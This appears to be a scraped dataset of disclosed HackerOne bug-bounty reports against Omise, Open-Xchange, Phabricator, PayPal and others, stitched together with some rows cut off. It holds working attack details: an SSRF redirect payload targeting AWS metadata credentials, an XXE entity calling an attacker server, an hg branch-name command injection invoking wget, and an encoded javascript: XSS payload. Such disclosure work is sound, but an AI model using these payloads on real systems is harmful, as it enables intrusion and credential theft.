I hope that everything is clear enough, but if not - please tell me, and I'll try to prepare better explaination, I'm also able to prepare video demonstration if you need one. Also if you have any other questions - feel free to ask me. 
Have a great day!

Omise,251-500,0.0,10m-50m,$700.00,High,7.1,Server-Side Request Forgery (SSRF),SSRF in webhooks leads to AWS private keys disclosure,"honoki  submitted a report to Omise.Mar 12th (4 years ago)Vulnerability Summary
Omise makes use of Amazon AWS as their application environment. Due to a vulnerability in the way webhooks are implemented, an attacker can make arbitrary HTTP/HTTPS requests from the application server and read their responses. This is known as a server-side request forgery (SSRF) vulnerability.
This vulnerability leads to access to Omise's Amazon EC2 instance with the user role aws-opsworks-ec2-role, including AWS private keys.
Description
The vulnerability exists in the way webhooks follow redirects. In general, it appears that redirects are not followed, but a HTTP 303 See Other status code allows an attacker to bypass this restriction.
By pointing my webhook URL to a server that issues a 303 redirect, I am able to redirect and read the responses of arbitrary HTTP/HTTPS requests from the application server. E.g. the following PHP script results in a successful request that is followed by the server:
<?php header('Location: http://<arbitrary-location>', TRUE, 303); ?>
As a result, it is possible to request a number of things, including AWS credentials on the metadata server located at http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-opsworks-ec2-role
Steps to reproduce

Impact
By exploiting this vulnerability, an unauthorized attacker could gain access to the AWS environment of Omise. Note that the SSRF vulnerability could be abused in a variety of ways, not just limited to obtaining AWS credentials. For example, to enumerate and access services and web applications running on the internal network.2 attachments:F440082: 20190312_AWS-SSRF-303-redirect-2.pngF440083: 20190312_AWS-SSRF-303-redirect.png",https://hackerone.com/reports/508459,Bangkok,Thailand,Bangkok,2019,3,12,14,32

During the parsing of Powerpoint files it seems that it is possible to include XXE payload which will be executed on the Open-XChange server. I was able to identify which files exist on the server, and cause the server make arbitrary request to my own server, and I am pretty sure it is also possible to read arbitrary files from the server as described here:
http://lab.onsec.ru/2014/06/xxe-oob-exploitation-at-java-17.html.
 I'll try to follow up with a full poc for reading files later today/tomorrow.
Steps to Reproduce

Create a powerpoint slide.
Open the created file using winrar (a pptx file is actually an archive).
Extract the tableStyles.xml file which is located in the ppt folder and open it in your favorite editor. It should look something like this:

Code 181 BytesWrap lines Copy Download1<?xml version=""1.0"" encoding=""UTF-8"" standalone=""yes""?>
2<a:tblStyleLst xmlns:a=""http://schemas.openxmlformats.org/drawingml/2006/main"" def=""{5C22544A-7EE6-4342-B048-85BDC9FD1C3A}""/>
Now, setup a server where you can view incoming connections and save the file to look like this:
Code 270 BytesWrap lines Copy Download1<?xml version=""1.0"" encoding=""UTF-8"" standalone=""yes""?>
2<!DOCTYPE r [<!ELEMENT r ANY ><!ENTITY sp SYSTEM ""https://{your-address}/"">]><r>&sp;</r>

Put the updated file back into the pptx by dragging it to the ppt folder.
Upload the file to Open-XChange and open it up. 
Check your server logs and see that a request from the user agent: Java/1.8.0_131 was sent.

Open-Xchange,251-500,0.0,10m-50m,$350.00,Medium,4.2,Cryptographic Issues - Generic,Command Injection via STARTTLS in SMTP,"murgi  submitted a report to Open-Xchange.May 21st (about 1 year ago)During our research into the security of email servers at Münster
University of Applied Sciences, we found a command injection
vulnerability related to STARTTLS in Dovecot. See the attached
advisory for details.
The vulnerability allows a MITM attacker between a mail client and
Dovecot to inject unencrypted commands into the encrypted TLS
context, redirecting user credentials and mails to the attacker. An
attacker needs to have sending permissions on the Dovecot server.
We have also attached a test script (buftest.py) for you to reproduce this
vulnerability yourself. Usage is pretty simple, call:
python3 buftest.py <hostname> --smtp --smtp-port <port>
and watch the output, it should tell you if the server is still
vulnerable. Call the script without parameters for more usage information.
Impact
A MITM attacker can potentially steal SMTP user credentials and mails.2 attachments:F1309952: buftest.pyF1309953: Dovecot_Advisory.pdfSummary by murgiAn issue was found in the submission component of Dovecot. A MITM attacker could inject plaintext into STARTTLS encrypted sessions, potentially stealing credentials an emails. The issue was fixed by Open-Xchange in Dovecot v2.3.14.1 and v2.3.15 and was assigned CVE-2021-33515.

Open-Xchange,251-500,0.0,10m-50m,$500.00,Medium,5.45,Cross-Site Request Forgery (CSRF),CSRF combined with IDOR within Document Converter exposes files,"logan5  submitted a report to Open-Xchange.Aug 22nd (4 years ago)Summary
There appears to be a vulnerability with the document converter service which allows an authenticated user or guest user with write permissions to export a victim’s files, regardless of permissions in place.  An example vulnerable endpoint is the following
https://sandbox.open-xchange.com/appsuite/api/oxodocumentconverter?action=getdocument&documentformat=pdf&priority=instant&filename=user1.txt&id=34%2F157&folder_id=34&mimetype=text%2Fplain&nocache=737&saveas_filename=user1.pdf&saveas_folder_id=34
The vulnerability consists of two steps, one requiring victim user interaction and the other action from the attacker. 
Step1:  CSRF vulnerability, victim user clicks on a link via a malicious email for example that will execute a URL similar to the above.   This will export a supported file into PDF format within their own home directory.
The above URL has been stripped of the following parameters which would usually be present:
UID: This is what enables the IDOR vulnerability.  Stripping the UID parameter will allow any authenticated user (and guest users that can write) to export the file to their own folders.  If the UID was in place then this is not possible.
Session:  The session token is unique and usually embedded within every HTTP request within the application.  Without it, the HTTP request usually fails.  In this case, dropping the session token does nothing. This allows the CSRF to be crafted as the parameters are now predictable.
Version: The version number has been removed
Step2:  The attacker needs to run an export PDF command of their own, this time changing the folder/file ID to being the victims file and also dropping the UID and Version parameter
Requirements for successful compromise:

The user must be logged in to App Suite with an active session or the CSRF will not execute.  
You will obviously need to know the correct target folder and file id to export.  This can be done through enumeration and trial/error
The target file has to be exportable as PDF

Note.  If the user deletes the created PDF file from their home directory after clicking the malicious link, it makes no difference in the outcome.
PoC Setup:
-Using the hosted environment at https://sandbox.open-xchange.com
Victim user: user.one@sandbox-5.open-xchange.com
Attacker user: user.two@sandbox-5.open-xchange.com
PoC
1)	Login as the victim user account (user.one@sandbox-5.open-xchange.com) and create a note file called ‘user1.txt’ with the contents “Hello, this is user1 of sandbox5”
Image F336690: user1_file.PNG 50.86 KiBZoom in Zoom out Copy Download
2)	Right-click on the file, select ‘save as pdf’.  Click on ‘Save’ and intercept the request within Burp Suite and send to the Repeater. Drop the original request and turn off the Intercept.
Note. Original request saved in 'user1_original.txt' for reference

3)	Within the repeater, remove the following parameters:

UID
Session
Version

Note. You could remove other parameters as well such as ‘nocache’ and ‘filename’ as they are optional.  Modified request saved in 'user1_modified.txt'
Image F336692: user1_modified.PNG 42.59 KiBZoom in Zoom out Copy Download
4)	Right click on the edited request and click on ‘Copy URL’.  Paste the URL into the browser of the original victim user session that should still be running.  This is simulating the CSRF as if the link had come from a malicious email for example.  You will receive a response that the file has been created:
https://sandbox.open-xchange.com/appsuite/api/oxodocumentconverter?action=getdocument&documentformat=pdf&priority=instant&filename=user1.txt&id=34%2F157&folder_id=34&mimetype=text%2Fplain&nocache=737&saveas_filename=user1.pdf&saveas_folder_id=34

Image F336689: user1_csrf_2.PNG 56.29 KiBZoom in Zoom out Copy Download
5)	In a separate browser session, I’ve used a Firefox private session.  Login as the attacker user (user.two@sandbox-5.open-xchange.com)
6)	In order to get the correct URL to modify, create your own text file (user2.txt) and save as PDF.  Send the request to the repeater. You can get rid of this file and drop the pdf creation request. 
Image F336687: user2_original.PNG 59.08 KiBZoom in Zoom out Copy Download
7)	In order to be brief, we will assume through trail and error that the attacker has enumerated the correct file/folder IDs for a file that can be converted to PDF and that the victim has clicked on the malicious link to expose the file via IDOR
8)	Modify the original attacker request and change the following fields to be the below:

Remove UID field
Remove filename=user2.txt  (Probably not required actually)
Change ID field to be 34%2F157   (This is 34/157 URL encoded, the victim file)
Change ‘folder_id’ field to be ‘34’

Click on ‘Go’ when ready
Image F336695: user2_export.PNG 89.66 KiBZoom in Zoom out Copy Download
Note. Modified request in 'user2_modifed.txt'
9)	View the file in the attacker browser, it is an exact copy of the victim file

Further analysis
CSRF is not really my forte, but I believe it may be possible to embed multiple App suite links in a malicious website or malicious email that the user can access.   This would greatly increase the enumeration of target files.  If you would like me to look into this then let me know.
Impact
I’m divided on impact on this one.  Yes, it’s quite serious as you could potentially export any user’s confidential documents.  However, you are dependent on a target user initiating the attack and you also require an active authenticated session yourself.11 attachments:F336686: user2_modified.txtF336687: user2_original.PNGF336688: user1_csrf_1.PNGF336689: user1_csrf_2.PNGF336690: user1_file.PNGF336691: user1_modified.txtF336692: user1_modified.PNGF336693: user1_original.PNGF336694: user1_original.txtF336695: user2_export.PNGF336696: user2_final.PNGmheiland Open-Xchange staff  changed the status to Triaged. Aug 27th (4 years ago)Great find, nice documentation!logan5   posted a comment. Aug 28th (4 years ago)Thanks!

Open-Xchange,251-500,0.0,10m-50m,$300.00,Medium,4.3,Denial of Service,A malicious user can upload a malicious script through managesieve  and trigger its execution in order to consume almost 100% of CPU (LMTP).,"rumata  submitted a report to Open-Xchange.Sep 23rd (2 years ago)Summary
A malicious user can create a  malicious sieve script (attached as ""test.sieve""), upload it to the server through managesieve and set as active. Then the user can send several specially crafted messages to himself to trigger long script execution. The attacker has to send one message per server core to get close to using 100% of CPU. The attacker can then disconnect from the server, but the high CPU usage will persist. It doesn't seem that the attack results in actual complete DoS, but it causes high resource consumption, which can result in financial loss or suspension of service from cloud provider (like in the case of Digital Ocean).
## The problem
(Please open the test.sieve file and look at the contents). Sieve execution isn't time-limited. Since the user can create a regex, even by using both a regex and a string less than 65536 symbols (limited by pigeonhole) the user comes close to macro time (around 200 ms of single-core execution on my laptop). It is then possible to simply repeat the match operation several times by duplicating the
Code 40 BytesWrap lines Copy Download1if string :regex  ""${final}"" ""${my_exp}""
If you repeat it 100 times, then one core will spend around 20 seconds on each letter to the malicious user.
When sieve was created, it was designed to be used without loops, because they could lead to a DoS from a malicious user. Then the MIME extension was introduced and it brought with itself a ""foreverypart"" loop. By using ""foreverypart"" and sending  a message like the following, we can multiply the time of the execution even further.

5--
6--

With the MIME part limit being in the thousands, the attacker can send (number of cores on server) messages and throttle CPU for days.
## Solution
There needs to be a default limit for sieve execution or regexp execution. The former is probably better, since it can defend against problems with possible future sieve extensions. Sieve scripts that go over the limit should be flagged and deactivated.

Open-Xchange,251-500,0.0,10m-50m,$400.00,Medium,4.2,Memory Corruption - Generic,access to stack memory beyond array boundaries,"ihsinme  submitted a report to Open-Xchange.Feb 14th (3 years ago)in PowerDNS Recursive Server in the rec-carbon.cc file in the void doCarbonDump (void *) function, lines 36..43 contain vulnerable code:
…..
char tmp[80];
memset(tmp, 0, sizeof(tmp));
gethostname(tmp, sizeof(tmp));
char p = strchr(tmp, '.');
if(p) p=0;
    hostname=tmp;
boost::replaceall(hostname, ""."", """");
…….
the vulnerability of which is provided by the implementation of the gethostname function, which, with a long name, does not provide a terminating zero at the end of the line:
…..
if (uname (&buf))
return -1;
node_len = strlen (buf.nodename) + 1;
memcpy (name, buf.nodename, len < node_len ? len : node_len);
if (node_len > len)
{
set_errno (ENAMETOOLONG);
return -1;
}
return 0;
…….
The code section indicated above becomes active for execution under conditions if the carbon-server address is specified in the configuration file and carbon-ourname is not specified. At the same time, this code is vulnerable under conditions if the hostname is larger than 80 bytes and the stack on which the call is being made is dirty (not reset).
The first condition is provided by the SUS, POSIX and LSB standards which define a length of 255 bytes, but it is worth noting that Linux does not currently adhere to this and uses a length of 64 bytes.
But certified operating systems support this agreement. I was able to verify the operation of this error on FreeBSD 12.0, Solaris 11.4, MacOS 10.12 Sierra.
The second condition is provided by several calls to the specified function, after which the stack itself is filled with the data used. It is worth noting that to increase the string data in the stack, you must take into account the requirements of Small String Optimization on your architecture when creating the configuration file. It is also necessary to indicate that the section of code described above is present in the auth-carbon.cc, dnsdist-carbon.cc files, however, it is called there once and the stack is clean enough so that the vulnerability touches only the terminating zero from the byte following the buffer, which in my opinion is not is critical.
Impact
The essence of the impact consists in the possibility of including garbage data on the stack in the logs of the carbon server and, in certain circumstances, the possibility of overwriting data (byte '.' By 0x00), which in the worst case can affect the execution vector (when modifying the return address) and as a result of abnormal termination.
As part of my experiments, I was able to send data from the configuration file to the corbon server, including other server addresses, stack addressing, and even konarike and increase the line length from 0x50 to 0x111. Unfortunately, I realized quite late that x32 tests would be more effective, but if you are interested, I will gladly repeat them on x32 versions of operating systems.",https://hackerone.com/reports/796555,Bavaria,Germany,Nuremberg,2020,2,14,11,12

At first,thanks for the bounty.
But according to your bounty policy ""up to a maximum of $5000 for the most severe vulnerabilities"" i think this vulnerability should be considered more severe.
Although this vulnearbility can't lead directly to RCE, it give a wide opportunity to the attacker to gather as much system information(passwd,shadow) or application secret config as they can.And with these informations attacker can make further damage to the system.
Also attacker can using this vulnerability to read sensitive information that belong to other users.
Thanks.

2What level of authentication at the attacker and victim side is required to make the attack work?
3Are social-engineering vectors (e.g. phishing) required to execute the vulnerability?
4Is the attack vector remotely exploitable and are multiple steps required to execute it?
5Does the attack require interaction of the victim to be effective?
6Does the attack rely on weaknesses in third party components on the victims side?
Also after checking with the questions that your guys using to review a report,i think this one should be consider more serious.
Thanks.mheiland Open-Xchange staff  posted a comment. Jan 12th (5 years ago)Hi @pnig0s, indeed the most severe vulns can be compensated with $5000. As you mentioned a RCE would be a candidate for such. The vulnerability you reported indeed allows to gather confidential information that could be used in a RCE situation. We valued your findings with the highest bounty ever payed by this program.
However we define severity for each finding individually and do not include assumptions about scenarios that include undiscovered vulnerabilities. Our severity->bounty formula is exponential and uses CVSS to determine a vulnerabilities value, something beyond 9.0 will get you to $5000, which matches typical ratings for RCE.mheiland Open-Xchange staff  closed the report and changed the status to Resolved. Jan 17th (5 years ago)We solved this vulnerability internally and will provide a backport to in-production releases during the next weeks.mheiland Open-Xchange staff  requested to disclose this report. Jul 4th (3 years ago)mheiland Open-Xchange staff  disclosed this report. Jan 24th (3 years ago)",https://hackerone.com/reports/303744,Bavaria,Germany,Nuremberg,2018,1,10,14,33

Since this is a blind SSRF, it is not possible to read the response of HTTP requests. However this vulnerability can be used for reconnaissance.
Example: Port Scan by measuring response time
To run a port scan on ports 7070,61616,8004,80,22,25,8080,3125 on the local network of server, execute the following command

From the above outputs, following observations can be made:

As we can see for closed ports 7070, 8080 and 3125, the response times are low (~ less than 3ms)
For open ports, depending on the type of listening connection, response time varies

For ssh (port 22) the response time is ~34ms
For exim (port 25) the response time is ~2170ms
For ActiveMQ (port 61616) the reponse time is ~3567ms
For http (port 80 and 8004) the response time is ~3ms (this type is hard to distinguish from closed ports)



So an attacker can use this vulnerability to detect most open ports and can use the response time to detect the type of connection (ssh / exim / activemq etc.)2 attachments:F814210: demo_ps.movF814219: poc.zipmheiland Open-Xchange staff  changed the status to Triaged. May 7th (3 years ago)mheiland Open-Xchange staff  updated the severity from medium to low (3.1). May 8th (3 years ago)mheiland Open-Xchange staff  posted a comment. May 8th (3 years ago)Thanks for reporting this vulnerability to us.

Here you need to keep the Current_Folder_ID and Target_folder_ID of you own calendars where you are admin . you just need to change appointmentID to private appointmentID where you are read only user. This request will be accepted by server and appointment will be added into your target calendar folderID. Once appointment is added into your folder you will be able to View all it's content and Edit it. 
Actual problem  : When you move the appointment , the appointment is copied with same appointmenID which leads to this attack . 
Issues :
1.You can view appointment it's attachments and members etc.
2.You can change the status of appointment.
3.You can edit the details of calendar.
4.You can move the calendar .
Let me know if you require Steps or Video POC for this issue.

In order for this to work you have to just pass in the GET parameter a folder id in where YOU have access for writing (it doesn't matter witch folder id is, you just need to be able to write in it!) and then change the attachement id. This will create a copy of the given attachement ID in the folder given in the JSON input (in the POC case 54). The server wil respond with the new folderID + file id.
Then you can go to you files and see the copy of the targeted id.
I have also attached 2 POC videos.
In the first you can see the attack. In the first seconds you can see that the folder parameter from the GET request is just being used for writing validation, it doesn't really happen anything with it, there is no validation whether the attachement is in the inputted folder or not. Then I will copy all the attachement across all the accounts (for example XXE and exif are in user2's account, and you can see I am logged in with user3).
Later in the video I have clicked the wrong links (while in incognito mode I cannot open files in new tabs because I am logged out), but in the second one you can see the download is working. Also sending the file per email or opening in browser works. That is why I have uploaded video 2.",https://hackerone.com/reports/204984,Bavaria,Germany,Nuremberg,2017,2,9,14,43
Open-Xchange,251-500,0.0,10m-50m,$444.00,Low,3.1,Denial of Service,Guard WKS lookup: Evil WKS server forces connections to last forever,"afewgoats  submitted a report to Open-Xchange.Oct 23rd (2 years ago)Summary by afewgoatsAny logged-in user can cause denial of service against the AppSuite server by asking Guard to fetch keys from a malicious WKS server. This WKS server's response never ends, tieing up a java process and TLS connection forever.
This was fixed in by Open-Xchange in GUARD-228
Reproduction Steps

Setup badly-behaving WKS server
Compose new email
Enable encryption with Guard by clicking the padlock
Enter ""To address"" of an email address on the malicious domain

Or just GET https://sandbox.open-xchange.com/appsuite/api/oxguard/keys?action=getRecipKey&email=8@my.dom.ain&session=...&ticks=123 with a valid session & cookies.
We enter function com.openexchange.guard.wksclient.impl.WKSClient.fetchKeys and AppSuite Guard makes an HTTP request to look up 8@my.dom.ain's public key at https://my.dom.ain/.well-known/openpgpkey/hu/93q5zuif339nunfaa4ph9z66trnkixy9
This AppSuiteGuard-to-WKS HTTP request never ends as my malicious WKS server evades the timeout.
The malicious WKS server responds, but very slowly: forever, at a rate of 1 byte per 3.21 seconds.
This prevents the timeout logic from killing the connection, so the connection stays open forever.
Timeout logic
The timeouts are specified with:
Code 375 Bytes1    private HttpClient getClient(int connectionTimeout) {
2        RequestConfig requestConfig = RequestConfig.custom()
3            .setConnectTimeout(connectionTimeout)
4            .setSocketTimeout(connectionTimeout)
5            .setRedirectsEnabled(false)
6            .build();
7        return HttpClientBuilder.create().setDefaultRequestConfig(requestConfig).build();
8    }

Connect timeout is bypassed because we do successfully make a connection.
Socket timeout is bypassed because the data flow isn't stopped. While slow, there is data received continuously at a rate of ~1 byte per 3210ms.

In this state, the AppSuiteGuard-to-WKS connection will never terminate. Memory of the process will increase.
I saw connections to my server from 157.97.76.28 from Apache-HttpClient/4.5.12 (Java/1.8.0_242) which lasted over 1 hour.
Making it more violent
I also made a variation where instead of very slow data transfer, the server responds with megabytes of never-ending data.
After 141.7MB was sent from my WKS server to AppSuite (around 15 seconds), a 500 Internal Error was returned.",https://hackerone.com/reports/1016691,Bavaria,Germany,Nuremberg,2020,10,23,1,0

Hello,
I believe I may have found another SSRF re-direct vulnerability which again will allow port scanning of the App Suite server and the internal network, this is similar to my earlier report: #293847
The endpoint is the following which is used to import contacts via external VCARD files:
http://<domain>/appsuite/api/import?action=VCARD
Pre-requisites to exploit this vulnerability are the following:
-Attacker server
-Attacker controlled domain name
-vcard file
-Valid session from login or anonymous link
Summary
The App Suite source code contains the following Java file which appears to be used to import a contact photograph via a URL, provided from a .vcard file:
backend/com.openexchange.contact.vcard.impl/src/com/openexchange/contact/vcard/impl/mapping/PhotoMapping.java
The section of code at line numbers 427-465 does a decent job of ensuring that any URL entered is not a local address to the App Suite server.  I had to modify my PoC from my previous report to take this into account.
Further in this file, is the below section which handles redirect requests, line numbers 479-491:
Code 858 BytesWrap lines Copy Download1// Follow & check redirects recursively
2            if (urlConnnection instanceof HttpURLConnection) {
3                HttpURLConnection httpURLConnection = (HttpURLConnection) urlConnnection;
4                int responseCode = httpURLConnection.getResponseCode();
5                if (responseCode == HttpURLConnection.HTTP_MOVED_PERM || responseCode == HttpURLConnection.HTTP_MOVED_TEMP) {
6                    String redirectUrl = urlConnnection.getHeaderField(""Location"");
7                    httpURLConnection.disconnect();
8                    return new LoadedImage(redirectUrl);
9                }
10                if (responseCode >= 400) {
11                    addConversionWarning(warnings, ""PHOTO"", ""image URL \"""" + origUrlString + ""\"" appears not to be valid, skipping import."");
12                    return NULL_RESULT;
13                }
14            }
 My interpretation was that if a redirect was sent that matched the following:
HTTP_MOVED_PERM
HTTP_MOVED_TEMP
Which translates to a HTTP 301 and 302 response according to the following Java documentation:
https://docs.oracle.com/javase/7/docs/api/java/net/HttpURLConnection.html
The returned URL would be re-checked to make sure it is not a local address.  The suspected vulnerability is the check of response codes 301 and 302, as it doesn’t take into account other HTTP re-direct response codes such as 303 and 305.  However, further testing proved that standard response codes were being accepted as well, e.g. 301/302.
Note.  I am not a programmer so the above analysis might be incorrect

1) The attacker_server.py script will run on 192.168.0.6 (Attacker server), this will setup a Python webserver running on port 70 and will await a GET request.
2) Netcat listeners are running on TCP port 2, 6, 8, and 10 to simulate listening ports that will accept HTTP connections on the App Suite server.
3) request.py will also run from the attacker server and connect to the target host (192.168.0.16), this will POST test.vcard to the vulnerable endpoint multiples times, 20 by default.  Make sure the test.vcard file is in the script working directory or it won't be uploaded.
4) The App Suite server will then carry out a DNS lookup to the photo URL which can be found in the vcard file
http://testserver65.com:70/test.jpeg  
In this case I added the following in /etc/hosts: <Wi-Fi gateway IP address> testserver65.com on the App Suite server.
The reason I’ve added a public IP address is that the Java file will block a private address during the initial POST.   So I used the gateway address on my home router to port-forward port 70 to port 70 on the attacker system (192.168.0.6).  I was using port 80 for something else in this case, hence the port change.
5) The attacker webserver will send a 301 response back after each request with the following URL: http://127.0.0.1:<port number>.  The port number will rotate on every GET request.
6) The HTTP response time will then be logged to the script_output.txt file when a port connection attempt is made.  Sorted in descending order of response time.
Results
-Below are the results from the script_out.txt file.  As you can see, the listening ports on the App-Suite server have the longest response times.  (Port 2, 6, 8, 10)

Impact
Again, as with the previous report, this vulnerability can mainly be used for blind port scanning and IP discovery on the target host and any internal networks the target host has access to.  There was no ability to extract files or access other data.

i tested that all post request has CSRF token.
During Author profile creation also a CSRF token is posted. Now when i removed this CSRF token , show   s error like bellow 
Code 500 BytesWrap lines Copy Download1CSRF validation failed

6 /var/www/csprng/src/public/index.php(86): Airship\Engine\AutoPilot->route(Object(Airship\Engine\Networking\HTTP\ServerRequest))
7{main}
So its a CSRF validation failed error.
Now if request submitted with proper CSRF token, then response will be 302 redirect.
So, i come to this point that if proper CSRF token provided then we get 302 redirect as success response and If CSRF validation failed then we get above error response or something else.
Now  during Blog Reply comment Following request POST data is made

Now remove the CSRF_TOKEN and see  302 redirect as response header, this  indicate that request is successfull and server does not checked CSRF here And no CSRF validation error.

Click on the X at the top right of the modal window

Explanation
The value of the paramter flow is a base64 value which decoded looks like this:
Code 45 BytesWrap lines Copy Download1returnUrl={paypal_url}&cancelUrl={paypal_url}
cancelUrl is passed as the href value of the X button at the top right of the modal window that appears. It doesn't matter if you already created a paypal.me address.
returnUrl is passed as the href value of the Done button when you follow the instructions to create a paypal.me profile.
The problem is that javascripT:paypal.com is considered a valid value for returnUrl and cancelUrl. However, there a few restrictions already: you can't add a %0a character (or almost any special character, even using HTML encoding) and the URL has to start with javascripT:*.paypal.com or javascripT:paypal.com or javascripT://paypal.com or javascripT://*.paypal.com.
First thing you have to take care of is about paypal.com because the object paypal doesn't exist, which will stop anything from working. The good thing is that PAYPAL does exist and PAYPAL.com is accepted as a valid value in the URL.
The second thing is that parentheses, quotes, semicolons and new lines are not allowed. But equal signs, commas and single quotes are allowed. So, you can set PAYAPL.com to any valid value you want like PAYPAL.com=1. Then you can use location and set it to something like 'javascript:alert\x28\x29'. I encoded the invalid special characters in a encoding that Javascript understands and will decode before changing the location. Now you can put anything you want.
On Firefox and Chrome, the location='javascript:alert\x28\x29' writes javascript:alert() in the document, so I had to change it to make it work. Ended up with this: location='javascript:\x3csvg\x20onload=alert\x28document.domain\x29\x3e'.

The main reason is that no state is maintained in the authentication flow. Although the Twitter flow still uses OAuth 1.0A, which has no state parameter as in OAuth 2, it is still possible to prevent this type of attack by setting an additional parameter in the oauth_callback value.
An attacker could exploit this bug as follows:

Attacker initiates Twitter OAuth process with Phabricator
Attacker allows access to Phabricator app
Attacker records and drops redirection to Phabricator (in order not to consume token)
Attacker directs victim to /auth/login/twitter:twitter.com/?oauth_token={attacker_token}&oauth_verifier={attacker_verifier}
Victim is now logged in as attacker

To mitigate this vulnerability, either maintain state in the authentication flow by adding a parameter in the callback value or, as Twitter seems to support OAuth 2, use that instead.",https://hackerone.com/reports/2228,No value,No value,No value,2014,2,23,17,25

Hope you are good!
Steps to repro:
1) Create a Phabricator account having email address ""a@x.com"".
2) Now Logout and ask for password reset link. Don't use the password reset link sent to your mail address.
3) Login using the same password back and update your email address to ""b@x.com"" and verify the same. Remove ""a@x.com"".
4) Now logout and use the password reset link which was mailed to ""a@x.com"" in step 2.
5) Password will be changed.
All previous password reset links should automatically expire once a user changes his email address.
Please fix this.

Phabricator,1-10,1.0,No value,"$1,000.00",No value,0.0,Improper Authentication - Generic,Bypass auth.email-domains,"tomvg  submitted a report to Phabricator.Feb 23rd (9 years ago)Email addresses are stored as VARCHAR(128). However, Phabricator does not verify the length of an email address upon registration. This allows attackers to bypass the allowed email-domains defined in auth.email-domains.
Exploiting this is rather straightforward: get an email address of 128 characters long (This StackOverflow answer indicates that the maximum length of an email address is 254 characters). Now register with your 128 character email address with @allowed-domain.com appended to it. The @allowed-domain.com part will be truncated because MySQL can’t store it, and you will receive a verification email on your 128 character email address.
This is especially easy if you’re using a Gmail address: if you own attacker@gmail.com, you’ll also receive any mails sent to attacker+aaaaaaaaaaa…aaa@gmail.com.",https://hackerone.com/reports/2224,No value,No value,No value,2014,2,23,16,8
Phabricator,1-10,1.0,No value,$500.00,No value,0.0,Improper Authentication - Generic,Bypass auth.email-domains (2),"tomvg  submitted a report to Phabricator.Feb 23rd (9 years ago)This vulnerability has the same effect as my previously reported bug #2224 Bypass auth.email-domains, but uses a very different approach, bypassing the current fix.
Instead of truncating through length, this vulnerability uses truncation via MySQL’s (weird) behaviour on inserting Unicode characters with code points greater than 0xFFFF into columns that have a utf8 charset. MySQL then truncates a string as soon as it reaches such a character. For more info, see How to support full Unicode in MySQL databases by @mathias.
To replicate, register an account with following address: attacker@gmail.com𝌆@allowed-domain.com.
I would suggest to reconsider not verifying email addresses as was mentioned here.",https://hackerone.com/reports/2233,No value,No value,No value,2014,2,23,18,44
Phabricator,1-10,1.0,No value,"$1,000.00",Critical,9.9,Command Injection - Generic,Command injection on Phabricator instance with an evil hg branch name,"pnig0s  submitted a report to Phabricator.Nov 9th (5 years ago)Hi phabricator,
I found an evil branch name of hg a repo can lead to arbitrary command injection on phabricator instance.
Here is the reproduction steps:

Monitor a remote mercurial repo with phabricator;
Create a branch and called ""--config=hooks.pre-log=wget"" on the remote;
After phabricator update the remote repo,visit the history page of that crafted branch;

Code 77 BytesWrap lines Copy Download1http://instanceip/source/hgclone/history/--config%253Dhooks.pre-log%253Dwget/

It will raise an error like below and the wget command will be executed;
I test this issue both on my own server instance and the cloud instance with mercurial 4.4(latest) installed(on my server).

Code 598 BytesWrap lines Copy Download1Command failed with error #255! COMMAND hg --config ui.ssh='/data/phabricator/phabricator/bin/ssh-

The root cause is that the branch name inject to the hg command directly and that define a hook will run before the hg log command been executed.

Phabricator,1-10,1.0,No value,$600.00,Medium,4.8,Information Disclosure,"Differential ""Show Raw File"" feature exposes generated files to unauthorised users","calvium  submitted a report to Phabricator.Mar 16th (6 years ago)Summary:
In certain circumstances, a user or mongoose can see a file from a diff they should not be able to see due to a policy.
Preface:
We are an app agency using a private Phabricator instance to manage projects. This issue prevents us from allowing clients to access our instance as they would have the ability to see some confidential content for other clients. Spaces and policies seem to work fine other than this issue.
Video:
Attached is a <8 min video where I show the issue on a fresh Phabricator installation. The first 6 mins is preparation. The issue is visible in the last 30 seconds.
You will see I look up ID of the generated file in the database to speed up the demonstration. We could scan through pages automatically with a script to make this bug more viable.
Reproduction steps:

Open two different browsers (to simulate two different users)
BROWSER 1: Log in as a user
BROWSER B: Log in as another user
BROWSER 1: Go to differential and create a new diff. Make it visible to just yourself
BROWSER 1: Update the diff a few times (I've seen the bug more reproducible when the diff is long and the update weaves in changes throughout the file, though this may not actually be a factor)
BROWSER B: Visit the diff page, see it is restricted and you cannot see it.
BROWSER 1: On the diff page, click ""View Options"" > ""Show Raw File (Right)"". This generates a File.
BROWSER B: Start guessing file number pages (this could be done automatically).
BROWSER B: Eventually you will hit the file number of the new file and can see the private diff from BROWSER 1.

Expected result:

The file generated by Phabricator while comparing diffs should not be accessible. It is not inheriting any policy.

Actual result:

BROWSER B can download the content of the file, seeing a private diff.

Conclusion:
We have over 80,000 files in our Phabricator instance from 10s of projects from various clients. If we share our instance with a client that is either malicious or naive in keeping their credentials secure, we would expose some of our other clients code as a consequence of using the ""Show Raw File"" feature.
Thanks

2.After trying, I found that there was no such submission restriction when the password was reset in the third step.
Repeat the above steps, the only difference is that you need to enter the correct verification code.

It can be seen that when we reset the password in the last step, the verification code will still be sent, that is, the verification code will be sent to the server for validity verification in the last step, and the verification code of the last step is not limited by the number of submissions. In other words, we can guess the verification code.

@nochnoidozor kobo   posted a comment. Oct 1st (3 years ago)Hi @noxx,
Thanks for reporting.
I took a look at your report, and have tested on my own to see if I can reproduce this. However, I was uncertain of a few things.

input the email verification code and try to guess the verification code, but I won’t be able to continue using it after I try it a few times.

We have a limit to the number of attempts for the authentication_code, and once the limit is reached, the authentication_code will be revoked.

After trying, I found that there was no such submission restriction when the password was reset in the third step.

What do you mean by this? What did you do that enabled you to submit without restrictions?noxx   posted a comment. Updated Oct 1st (3 years ago)Yes, there is a limit on the number of authentication_codes in the second step of password reset.

The PlayStation Now application version 11.0.2 is vulnerable to remote code execution (RCE). Any website loaded in any browser on the same machine can run arbitrary code on the machine through a vulnerable websocket connection.

The local websocket server at localhost:1235 does not check the origin of incoming requests.

This allows websites loaded in browsers on the same machine to send requests to the websocket server.
Websockets are not bound by the Same-Origin Policy so the websocket server has to do this manually.


psnow launches an Electron application named AGL.

It's possible to tell AGL to load a specific website with a command sent to the websocket server.
As a result, the websites above can tell AGL to load any remote URL.
It's also possible to tell AGL to run any local application via the setUrlDefaultBrowser command.


The AGL Electron application has nodeIntegration: true so JavaScript running in any loaded URL can spawn new processes.

So any URL loaded in the AGL application can run code on the target machine.



Chaining these three issues gives us RCE.
Description
